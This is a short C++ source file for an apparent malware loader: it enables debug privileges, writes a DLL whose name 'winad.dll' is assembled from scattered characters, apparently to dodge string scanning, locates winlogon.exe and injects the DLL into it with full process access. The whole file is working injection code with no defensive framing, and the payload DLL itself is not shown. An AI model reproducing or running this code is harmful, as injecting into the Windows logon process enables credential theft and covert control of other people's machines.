#include "includes.h"
#pragma warning(disable : 4996)

int main()
{
	DWORD success = 0;
	// Getting Debug privileges
	Helper::GetDebugPrivs();
	// Extracting the dll (that will be injected to winlogon.exe)
	char directoryPath[MAX_PATH] = { 0 };
	char dllPath[MAX_PATH] = { 0 };
	GetCurrentDirectoryA(MAX_PATH, directoryPath);
	sprintf(dllPath, "%s\\%s.%cl%c", directoryPath, "winad", 'd', 'l');
	success = Helper::CreateDllFile(dllPath);
	if (success) {
		// Finding winlogon.exe process ID
		DWORD dwPID = Helper::FindPID();
		if (dwPID) {
			// Getting a handle to winlogon.exe
			HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID);

			if (hProcess != INVALID_HANDLE_VALUE) {
				// Injecting dll to winlogon
				Helper::InjectDll(hProcess, dllPath);
			}

			// Closing handle to winlogon process
			CloseHandle(hProcess);
		}
	}

	return 0;
}